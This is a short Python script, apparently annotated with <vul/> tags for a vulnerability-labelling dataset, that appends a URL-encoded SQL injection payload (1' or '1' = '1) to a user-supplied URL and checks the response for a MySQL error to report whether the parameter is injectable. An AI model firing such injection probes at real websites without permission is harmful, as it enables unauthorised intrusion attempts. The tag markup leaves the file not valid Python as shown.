import sys
import urllib
import urllib.request

<vul/># example : http://mywebsite.com/index.php?item=42
# this script will check if the parameter 'item' is injectable</vul>

uri = None

<vul/>for carg in sys.argv:</vul>
	# read the arg that follow -w
	<vul/>if carg == "-w":
		arg_num = sys.argv.index(carg)
		arg_num += 1
		if len(sys.argv) > arg_num:
			uri = sys.argv[arg_num]</vul>

# if there is no value for -w parameter, throw an error and exit
if uri is None:
	sys.exit("[ERROR] You have to pass the URI to test to the -w parameter !")

injected_url = uri + "1'%20or%20'1'%20=%20'1"

# make the request
resp = urllib.request.urlopen(injected_url)

# parse response
body = resp.read()
full_body = body.decode('utf-8')

# check vulnerability by looking at the response
if "You have an error in your SQL syntax" in full_body:
	print ("Vulnerable to SQL injection !!")
else:
	print ("Not vulnerable to SQL injection.")
